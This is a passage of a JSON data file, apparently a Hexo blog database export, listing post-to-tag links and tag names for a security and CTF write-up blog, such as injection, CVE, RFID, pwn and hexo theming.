sxy79pm","_id":"ckffbhoz4003rez8k42qe2zjz"},{"post_id":"ckffbhoxu000yez8k3csit8zi","tag_id":"ckffbhoz3003nez8kjfwo3k9k","_id":"ckffbhoz4003sez8k9m6yfisr"},{"post_id":"ckffbhoxu000yez8k3csit8zi","tag_id":"ckffbhoz3003pez8kih2e4ez3","_id":"ckffbhoz4003uez8kap4hjsc4"},{"post_id":"ckffbhoxz000zez8kp34ekjuc","tag_id":"ckffbhoz4003qez8ki5te5v1i","_id":"ckffbhoz5003wez8kcjhqpzkz"},{"post_id":"ckffbhoxz000zez8kp34ekjuc","tag_id":"ckffbhoz4003tez8kxzcwubar","_id":"ckffbhoz5003xez8kxa6e9lez"},{"post_id":"ckffbhoy10011ez8kr67wwkid","tag_id":"ckffbhoz3003pez8kih2e4ez3","_id":"ckffbhoz6003zez8kpdipmdsy"},{"post_id":"ckffbhoy40013ez8kd073uqkw","tag_id":"ckffbhowm0004ez8ksardp5mn","_id":"ckffbhoz60041ez8kbsmyh5xh"},{"post_id":"ckffbhoy40013ez8kd073uqkw","tag_id":"ckffbhoyu002tez8kyyyspb6z","_id":"ckffbhoz60042ez8k0sovy0tj"},{"post_id":"ckffbhoy40013ez8kd073uqkw","tag_id":"ckffbhoz60040ez8ksulqw08s","_id":"ckffbhoz60043ez8kwu4z46xh"}],"Tag":[{"name":"writeup","_id":"ckffbhowm0004ez8ksardp5mn"},{"name":"逆向","_id":"ckffbhox0000aez8kwok6nw72"},{"name":"misc","_id":"ckffbhox7000dez8kdm41ndeo"},{"name":"git","_id":"ckffbhoxb000gez8ki2ale646"},{"name":"漏洞","_id":"ckffbhoxf000jez8k48d753qd"},{"name":"CVE","_id":"ckffbhoxk000pez8kcafts4sy"},{"name":"提权","_id":"ckffbhoxp000uez8kj33c9m56"},{"name":"ubuntu","_id":"ckffbhoxu000xez8k0v3mlzg7"},{"name":"注入","_id":"ckffbhoy10010ez8kqjhga78v"},{"name":"web","_id":"ckffbhoy50015ez8k9i8ff21v"},{"name":"盲注","_id":"ckffbhoy60018ez8kamocws4n"},{"name":"硬件安全","_id":"ckffbhoy70019ez8kl81l5ro7"},{"name":"badusb","_id":"ckffbhoy7001cez8kj6c9au4u"},{"name":"Proxmark3","_id":"ckffbhoy8001eez8kijnmikx0"},{"name":"RFID","_id":"ckffbhoy8001hez8k2wfdi8u2"},{"name":"硬件破解","_id":"ckffbhoy8001iez8k56h9hml3"},{"name":"ctf","_id":"ckffbhoyc001mez8kmhx4jddr"},{"name":"CSAW'18 CTF","_id":"ckffbhoyl0025ez8kqy5vcd5o"},{"name":"信息收集","_id":"ckffbhoyl0027ez8k7dmdj88a"},{"name":"Web","_id":"ckffbhoym002aez8k9anh40zt"},{"name":"渗透测试","_id":"ckffbhoyn002dez8kq79c8oyh"},{"name":"PCB鹏城杯","_id":"ckffbhoyp002eez8kucjauntj"},{"name":"pwn","_id":"ckffbhoyq002hez8k4rvb7l3s"},{"name":"crypro","_id":"ckffbhoyr002jez8khl3i9oih"},{"name":"暴力破解","_id":"ckffbhoyr002kez8kgwaorb2e"},{"name":"crypto","_id":"ckffbhoyu002tez8kyyyspb6z"},{"name":"国赛","_id":"ckffbhoyx0031ez8klftt24s2"},{"name":"linux","_id":"ckffbhoyz0038ez8kvm290afd"},{"name":"应急响应","_id":"ckffbhoyz003bez8kit3pgodd"},{"name":"writewp","_id":"ckffbhoz2003hez8k1y4k45l9"},{"name":"hitokoto","_id":"ckffbhoz2003kez8k1sxy79pm"},{"name":"fluid","_id":"ckffbhoz3003nez8kjfwo3k9k"},{"name":"hexo","_id":"ckffbhoz3003pez8kih2e4ez3"},{"name":"美化","_id":"ckffbhoz4003qez8ki5te5v1i"},{"name":"yilia","_id":"ckffbhoz4003tez8kxzcwubar"},{"name":"RCTF","_id":"ckffbhoz60040ez8ksulqw08s"}]}}